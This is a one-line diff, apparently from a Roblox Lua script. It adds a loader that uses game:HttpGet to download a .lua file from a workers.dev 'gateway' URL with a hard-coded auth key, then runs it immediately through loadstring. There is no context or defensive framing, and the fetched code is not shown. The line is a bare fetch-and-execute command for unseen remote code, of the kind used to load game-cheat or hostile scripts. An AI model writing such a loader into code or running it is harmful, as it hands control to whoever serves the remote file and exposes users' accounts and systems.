@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://lazybear-gateway.iusemaybehook.workers.dev/?file=1468213301233062013_1.lua", true, {["X-Auth-Key"] = "default_secure_key_123"}))()
